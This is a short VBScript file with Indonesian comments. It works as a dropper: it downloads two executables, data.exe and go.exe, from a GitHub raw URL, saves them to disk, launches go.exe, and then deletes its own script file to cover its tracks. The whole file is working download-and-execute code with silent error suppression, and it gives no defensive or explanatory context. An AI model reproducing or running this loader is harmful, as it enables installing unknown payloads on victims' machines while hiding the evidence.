Option Explicit

Dim objXMLHTTP, objFSO, objShell
Dim urls, filenames
Dim i

' Inisialisasi objek
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Daftar URL dan nama file
urls = Array( _
    "https://raw.githubusercontent.com/xirepo/xi/main/data.exe", _
    "https://raw.githubusercontent.com/xirepo/xi/main/go.exe" _
)

filenames = Array("data.exe", "go.exe")

' Proses pengunduhan
For i = 0 To UBound(urls)
    On Error Resume Next
    
    objXMLHTTP.Open "GET", urls(i), False
    objXMLHTTP.Send
    
    If Err.Number = 0 And objXMLHTTP.Status = 200 Then
        Dim objStream
        Set objStream = CreateObject("ADODB.Stream")
        
        objStream.Open
        objStream.Type = 1 ' Binary
        objStream.Write objXMLHTTP.ResponseBody
        objStream.SaveToFile filenames(i), 2 ' Overwrite
        objStream.Close
        
        Set objStream = Nothing
    Else
        ' Optional: bisa ditambahkan logging jika diperlukan
        ' WScript.Echo "Gagal mengunduh: " & urls(i)
    End If
    
    On Error GoTo 0
Next

' Jalankan go.exe jika berhasil diunduh
If objFSO.FileExists("go.exe") Then
    objShell.Run """go.exe""", 1, False
End If

' Hapus script VBS sendiri
Dim strScript
strScript = WScript.ScriptFullName

If objFSO.FileExists(strScript) Then
    objFSO.DeleteFile strScript, True
End If

' Bersihkan objek
Set objXMLHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
